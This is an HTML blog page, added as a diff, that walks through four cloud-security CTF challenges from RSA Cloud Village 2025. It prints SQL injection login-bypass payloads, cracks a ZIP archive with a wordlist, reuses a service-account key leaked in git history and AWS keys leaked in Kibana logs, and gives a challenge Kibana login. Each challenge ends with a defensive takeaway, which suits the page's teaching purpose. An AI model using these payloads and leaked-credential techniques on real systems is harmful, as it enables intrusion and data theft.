@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF Writeup: RSA Cloud Village CTF 2025 | Anvit</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@300;400;500&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,300&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root, [data-theme="light"] {
+      --bg:#ffffff; --card:#EDECEA; --border:#D6D4CE;
+      --text:#000000; --muted:#6A6864; --faint:#9E9C98;
+      --primary:#1E1E1C; --primary-fg:#F5F4F0;
+      --secondary:#E2E0DB; --sec-fg:#3A3835;
+      --nav-bg:rgba(245,244,240,0.85); --code-bg:#F0EDEA;
+    }
+    [data-theme="dark"] {
+      --bg:#000000; --card:rgb(7,9,11); --border:#30363d;
+      --text:#ffffff; --muted:#8b949e; --faint:#484f58;
+      --primary:#e6edf3; --primary-fg:#0d1117;
+      --secondary:#21262d; --sec-fg:#c9d1d9;
+      --nav-bg:rgba(0,0,0,0.88); --code-bg:#0d1117;
+    }
+    html { scroll-behavior: smooth; }
+    body { background:var(--bg); color:var(--text); font-family:'DM Sans',sans-serif; font-size:15px; line-height:1.7; -webkit-font-smoothing:antialiased; min-height:100vh; transition:background 0.3s,color 0.3s; }
+    a { color:inherit; text-decoration:none; }
+    header { position:sticky; top:0; z-index:50; background:var(--nav-bg); backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px); border-bottom:1px solid var(--border); transition:background 0.3s,border-color 0.3s; }
+    .nav-inner { max-width:896px; margin:0 auto; padding:16px 24px; display:flex; align-items:center; justify-content:space-between; }
+    .nav-links { display:flex; gap:24px; list-style:none; }
+    .nav-links a { font-size:14px; color:var(--muted); transition:color 0.15s; }
+    .nav-links a:hover { color:var(--text); }
+    .theme-toggle { width:32px; height:32px; border-radius:8px; background:var(--card); border:1px solid var(--border); cursor:pointer; display:flex; align-items:center; justify-content:center; transition:background 0.2s; color:var(--muted); }
+    .theme-toggle:hover { background:var(--secondary); color:var(--text); }
+    .theme-toggle svg { width:15px; height:15px; }
+    .icon-sun{display:none;} .icon-moon{display:block;}
+    [data-theme="light"] .icon-sun{display:block;} [data-theme="light"] .icon-moon{display:none;}
+    .page { max-width:740px; margin:0 auto; padding:0 24px; }
+    main { padding-bottom:80px; }
+    .back-link { display:inline-flex; align-items:center; gap:6px; font-size:13px; color:var(--muted); margin:32px 0 28px; transition:color 0.15s; }
+    .back-link:hover { color:var(--text); }
+    .back-link svg { width:14px; height:14px; }
+    .post-header { margin-bottom:36px; padding-bottom:28px; border-bottom:1px solid var(--border); }
+    .post-meta-top { display:flex; align-items:center; gap:8px; margin-bottom:14px; flex-wrap:wrap; }
+    .post-tag { background:var(--secondary); color:var(--sec-fg); border-radius:4px; padding:2px 8px; font-size:11px; font-weight:600; }
+    .post-tag.highlight { background:rgba(59,130,246,0.12); color:#60a5fa; }
+    .post-date { font-family:'DM Mono',monospace; font-size:12px; color:var(--faint); }
+    .post-sep { color:var(--faint); }
+    .post-title { font-size:clamp(22px,4vw,32px); font-weight:600; letter-spacing:-0.03em; line-height:1.25; color:var(--text); margin-bottom:10px; }
+    .post-subtitle { font-size:14px; color:var(--muted); line-height:1.65; }
+    .toc { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:16px 20px; margin-bottom:8px; }
+    .toc-label { font-size:10px; font-weight:600; font-family:'DM Mono',monospace; color:var(--faint); text-transform:uppercase; letter-spacing:0.1em; margin-bottom:10px; }
+    .toc ol { padding-left:16px; display:flex; flex-direction:column; gap:5px; }
+    .toc li { font-size:13px; }
+    .toc a { color:var(--muted); transition:color 0.15s; }
+    .toc a:hover { color:var(--text); }
+    .challenge { margin-top:52px; }
+    .ch-header { margin-bottom:20px; padding-bottom:14px; border-bottom:1px solid var(--border); }
+    .ch-title { font-size:20px; font-weight:600; letter-spacing:-0.02em; color:var(--text); margin-bottom:8px; }
+    .ch-badges { display:flex; gap:5px; flex-wrap:wrap; }
+    .badge { font-family:'DM Mono',monospace; font-size:10px; padding:2px 8px; border-radius:4px; border:1px solid var(--border); color:var(--muted); }
+    .content { display:flex; flex-direction:column; gap:14px; }
+    .content p { font-size:15px; color:var(--text); line-height:1.75; }
+    .content ul, .content ol { padding-left:20px; display:flex; flex-direction:column; gap:5px; }
+    .content li { font-size:14px; color:var(--text); line-height:1.7; }
+    .content strong { font-weight:600; }
+    .content a { color:var(--muted); border-bottom:1px solid var(--border); transition:color 0.15s; word-break:break-all; }
+    .content a:hover { color:var(--text); }
+    .content pre { background:var(--code-bg); border:1px solid var(--border); border-radius:8px; padding:14px 18px; overflow-x:auto; font-family:'DM Mono',monospace; font-size:12.5px; line-height:1.7; color:var(--text); }
+    .content code:not(pre code) { background:var(--code-bg); border:1px solid var(--border); border-radius:4px; padding:1px 6px; font-family:'DM Mono',monospace; font-size:12.5px; }
+    .callout { border-left:3px solid; padding:12px 16px; border-radius:0 6px 6px 0; margin-top:4px; }
+    .callout.flag { border-color:#22c55e; background:rgba(34,197,94,0.07); }
+    .callout.flag p { font-family:'DM Mono',monospace; font-size:13px !important; color:#22c55e !important; }
+    .callout.tip { border-color:#f59e0b; background:rgba(245,158,11,0.07); }
+    .callout.tip p { font-size:13px !important; color:var(--text) !important; }
+    .ch-divider { border:none; border-top:1px solid var(--border); margin-top:52px; }
+    footer { padding:32px 0 60px; border-top:1px solid var(--border); margin-top:64px; }
+    .footer-inner { max-width:896px; margin:0 auto; padding:0 24px; }
+    .footer-copy { font-size:12px; color:var(--faint); }
+    @media(max-width:480px) { .page,.nav-inner{padding-left:16px;padding-right:16px;} }
+  </style>
+</head>
+<body>
+<header>
+  <div class="nav-inner">
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../projects.html">Projects</a></li>
+      <li><a href="../blogs.html">Blogs</a></li>
+    </ul>
+    <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+      <svg class="icon-sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      <svg class="icon-moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+    </button>
+  </div>
+</header>
+
+<div class="page"><main>
+  <a href="../blogs.html" class="back-link">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+    back to blog
+  </a>
+
+  <div class="post-header">
+    <div class="post-meta-top">
+      <span class="post-tag highlight">cloud</span>
+      <span class="post-tag">aws</span>
+      <span class="post-tag">gcp</span>
+      <span class="post-tag">forensics</span>
+      <span class="post-tag">ctf</span>
+      <span class="post-sep">·</span>
+      <span class="post-date">RSA Conference 2025</span>
+    </div>
+    <h1 class="post-title">CTF Writeup: RSA Cloud Village CTF 2025</h1>
+    <p class="post-subtitle">Four cloud security challenges from RSA Conference's Cloud Village CTF — SQL injection + Azure blob cracking, GCP git secret leaks, log-hidden Base64 forensics, and leaked IAM creds in an open ELK stack.</p>
+  </div>
+
+  <div class="toc">
+    <p class="toc-label">Challenges</p>
+    <ol>
+      <li><a href="#game-over">Game Over: Incident Response</a></li>
+      <li><a href="#pixelgen">PixelGen</a></li>
+      <li><a href="#kqlog">The Cheat in the KQLog</a></li>
+      <li><a href="#phantom-s3">The Phantom S3 Heist</a></li>
+    </ol>
+  </div>
+
+  <!-- ── 1. GAME OVER ── -->
+  <div class="challenge" id="game-over">
+    <div class="ch-header">
+      <h2 class="ch-title">Game Over: Incident Response</h2>
+      <div class="ch-badges">
+        <span class="badge">SQL Injection</span>
+        <span class="badge">Azure Blob Storage</span>
+        <span class="badge">fcrackzip</span>
+      </div>
+    </div>
+    <div class="content">
+      <p><strong>Description:</strong> Anomalies detected. Alarms blaring. The system's in lockdown — can you trace the breach, decode the chaos, and contain the fallout before the system pulls the plug? Target: <code>http://game-over-dev.s3-website-us-west-2.amazonaws.com/</code></p>
+      <p>I started by visiting the target site and found a login page. Based on the hints ("Simple for both? Nothing is ever that simple!"), SQL injection seemed likely. I tested the password field with common payloads:</p>
+      <pre>' OR '1'='1
+' OR 1=1--
+' OR 'a'='a
+admin' --</pre>
+      <p>One of them bypassed the login and returned a full JSON dump of the user table:</p>
+      <pre>[
+  { "id": 1, "username": "gcp",   "password": "hello_gcp"   },
+  { "id": 2, "username": "user1", "password": "password123"  },
+  { "id": 3, "username": "user2", "password": "letmein"      },
+  { "id": 4, "username": "azure", "password": "https://gameoverstorage.blob.core.windows.net/gameoverblob/protected_folder.zip" }
+]</pre>
+      <p>The <code>azure</code> user's "password" was an Azure Blob Storage URL pointing to a ZIP. I downloaded it:</p>
+      <pre>wget https://gameoverstorage.blob.core.windows.net/gameoverblob/protected_folder.zip
+unzip -l protected_folder.zip</pre>
+      <p>The ZIP was password-protected. I tried the obvious passwords from the dump — none worked. I moved to a dictionary attack using <code>fcrackzip</code> with <code>rockyou.txt</code>:</p>
+      <pre>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt protected_folder.zip</pre>
+      <p>The password was cracked quickly. After extraction, <code>file3.txt</code> contained the flag.</p>
+      <div class="callout flag"><p>🚩 Flag found in file3.txt inside the cracked ZIP</p></div>
+      <div class="callout tip"><p><strong>Takeaway:</strong> SQL injection on login forms is still a high-impact vulnerability. Never expose storage URLs as credentials, and use strong passwords on archives — especially ones containing sensitive data.</p></div>
+    </div>
+  </div>
+
+  <hr class="ch-divider">
+
+  <!-- ── 2. PIXELGEN ── -->
+  <div class="challenge" id="pixelgen">
+    <div class="ch-header">
+      <h2 class="ch-title">PixelGen</h2>
+      <div class="ch-badges">
+        <span class="badge">Git History</span>
+        <span class="badge">GCP / GCS</span>
+        <span class="badge">Service Account Key Leak</span>
+      </div>
+    </div>
+    <div class="content">
+      <p><strong>Description:</strong> PixelGen Cloud converts photos into pixel-perfect retro sprites. Repo: <a href="https://github.com/cloud-village/PixelGen" target="_blank" rel="noopener">github.com/cloud-village/PixelGen</a>. Hints: developers sometimes commit secrets by accident — look at the git history, and there's a Google Cloud Storage bucket involved.</p>
+      <p>I cloned the repo and inspected the commit history:</p>
+      <pre>git clone https://github.com/cloud-village/PixelGen.git
+cd PixelGen
+git log</pre>
+      <p>A commit labeled <strong>"oops"</strong> immediately caught my eye. I inspected it:</p>
+      <pre>git show c1e50e26cb81f278609604c3aaf5dd24257e1c0d</pre>
+      <p>The diff showed deleted environment variable exports that referenced a service account key file and a GCS bucket:</p>
+      <pre>export GOOGLE_APPLICATION_CREDENTIALS="config.json"
+export GCS_BUCKET_NAME="pixelgen-bucket"
+gcloud auth activate-service-account --key-file=$GOOGLE_APPLICATION_CREDENTIALS</pre>
+      <p>The <code>config.json</code> had been deleted in a later commit but its full contents were still visible in the diff. I recreated the file from the history. Trying anonymous bucket access first:</p>
+      <pre>gsutil ls gs://pixelgen-bucket/
+# → AccessDenied</pre>
+      <p>So I installed the Google Cloud SDK and authenticated with the recovered service account key:</p>
+      <pre>curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-sdk-460.0.0-linux-x86_64.tar.gz
+tar -xf google-cloud-sdk-460.0.0-linux-x86_64.tar.gz
+./google-cloud-sdk/install.sh
+./google-cloud-sdk/bin/gcloud auth activate-service-account --key-file=config.json</pre>
+      <p>With auth working, I listed the bucket and downloaded the flag:</p>
+      <pre>./google-cloud-sdk/bin/gsutil ls gs://pixelgen-bucket/
+# → gs://pixelgen-bucket/flag.txt
+./google-cloud-sdk/bin/gsutil cp gs://pixelgen-bucket/flag.txt .</pre>
+      <div class="callout flag"><p>🚩 Flag retrieved from gs://pixelgen-bucket/flag.txt</p></div>
+      <div class="callout tip"><p><strong>Takeaway:</strong> Deleting a file in a commit does not remove it from git history. Use <code>git filter-repo</code> or BFG Repo Cleaner to scrub secrets. Pre-commit hooks like <code>git-secrets</code> or truffleHog can catch this before it ever hits a remote.</p></div>
+    </div>
+  </div>
+
+  <hr class="ch-divider">
+
+  <!-- ── 3. KQLOG ── -->
+  <div class="challenge" id="kqlog">
+    <div class="ch-header">
+      <h2 class="ch-title">The Cheat in the KQLog</h2>
+      <div class="ch-badges">
+        <span class="badge">Log Forensics</span>
+        <span class="badge">Base64</span>
+        <span class="badge">S3 Public Access</span>
+      </div>
+    </div>
+    <div class="content">
+      <p><strong>Description:</strong> During a scheduled threat-hunting minigame, a security analyst noticed something strange in the event logs of the mainframe. The patterns looked routine — until a pixel out of place revealed a glitch in the matrix. Someone had tried to cover their tracks. Can you spot the misstep, trace the trail, and unlock the hidden flag before the clock runs out?</p>
+      <p>The challenge provided a log file with 1,001 entries. I started scanning for anomalies — null fields, malformed rows, anything that didn't match the pattern of the other entries.</p>
+      <p>At index <strong>499</strong>, one entry stood out. All other rows had properly structured <code>EventID</code>, <code>Source</code>, <code>User</code>, and <code>Description</code> fields. This row had a very long comma-separated string in its <code>Timestamp</code> field, with all other fields empty.</p>
+      <p>The long string looked like Base64. I decoded it and got a legitimate-looking log line:</p>
+      <pre>2025-03-08 09:14:25,4662,Microsoft Sentinel,unknown,
+Suspicious DCSync operation detected. Unusual replication activity
+observed. Investigation advised: check s3://cheat-kqlog/</pre>
+      <p>The decoded message pointed to an S3 bucket. I tried listing it:</p>
+      <pre>aws s3 ls s3://cheat-kqlog/
+# → AccessDenied
+
+aws s3 ls s3://cheat-kqlog/ --no-sign-request
+# → flag.txt</pre>
+      <p>Anonymous access worked with <code>--no-sign-request</code>. I downloaded the flag:</p>
+      <pre>aws s3 cp s3://cheat-kqlog/flag.txt . --no-sign-request</pre>
+      <div class="callout flag"><p>🚩 Flag retrieved from s3://cheat-kqlog/flag.txt</p></div>
+      <div class="callout tip"><p><strong>Takeaway:</strong> Threat actors can hide data in unexpected log fields to evade automated parsers. Always validate that fields conform to expected types and lengths — a timestamp field containing 500+ characters is a dead giveaway.</p></div>
+    </div>
+  </div>
+
+  <hr class="ch-divider">
+
+  <!-- ── 4. PHANTOM S3 ── -->
+  <div class="challenge" id="phantom-s3">
+    <div class="ch-header">
+      <h2 class="ch-title">The Phantom S3 Heist</h2>
+      <div class="ch-badges">
+        <span class="badge">Kibana / ELK</span>
+        <span class="badge">Leaked IAM Credentials</span>
+        <span class="badge">S3</span>
+      </div>
+    </div>
+    <div class="content">
+      <p><strong>Description:</strong> After Phantom's latest game drop, a misconfigured ELK stack was left wide open — logging everything without redaction. Somewhere in those logs: leaked IAM credentials and the path to a hidden S3 bucket. Trace the attacker's steps, find the creds, and steal the flag.</p>
+      <p>Credentials provided: Kibana at <code>http://13.52.35.182:5601/</code> with <code>elastic / c8PBcuDi8K7feZ7Wg*sf</code>.</p>
+      <p>Inside Kibana, I searched for keywords like <code>flag</code> and <code>secret</code>. A log entry surfaced showing an <code>s3:PutObject</code> event — someone had uploaded <code>flag.txt</code> to a bucket:</p>
+      <pre>Bucket: phantom-s3-heist-20250426231616516300000002
+Region: us-west-1
+Event:  s3:PutObject → flag.txt</pre>
+      <p>My first attempts to access the bucket both failed:</p>
+      <pre>aws s3 ls s3://phantom-s3-heist-20250426231616516300000002/
+# → AccessDenied
+
+aws s3 ls s3://phantom-s3-heist-20250426231616516300000002/ --no-sign-request
+# → AccessDenied</pre>
+      <p>The bucket wasn't publicly accessible. I went back into Kibana and searched for <code>user</code> — finding an AWS Access Key ID in the logs. Then searched for <code>secretAccessKey</code> and found the matching secret. I configured the CLI with these leaked credentials:</p>
+      <pre>aws configure
+# AWS Access Key ID: [from Kibana logs]
+# AWS Secret Access Key: [from Kibana logs]
+# Default region: us-west-1</pre>
+      <p>With valid credentials, I copied the flag directly:</p>
+      <pre>aws s3 cp s3://phantom-s3-heist-20250426231616516300000002/flag.txt ./flag.txt</pre>
+      <div class="callout flag"><p>🚩 Flag retrieved from s3://phantom-s3-heist-.../flag.txt</p></div>
+      <div class="callout tip"><p><strong>Takeaway:</strong> ELK stacks with public access and no field-level redaction are a goldmine for attackers. AWS credentials should never appear in application logs. Use IAM roles instead of long-lived access keys, and audit your log pipelines for credential leakage regularly.</p></div>
+    </div>
+  </div>
+
+</main></div>
+
+<footer><div class="footer-inner">
+  <p class="footer-copy">© 2025 Anvit Mirjurkar</p>
+</div></footer>
+
+<script>
+(function(){const h=document.documentElement,b=document.getElementById('themeToggle'),s=localStorage.getItem('anvit-theme')||'dark';h.setAttribute('data-theme',s);b.addEventListener('click',function(){const n=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',n);localStorage.setItem('anvit-theme',n);});})();
+</script>
+</body>
+</html>
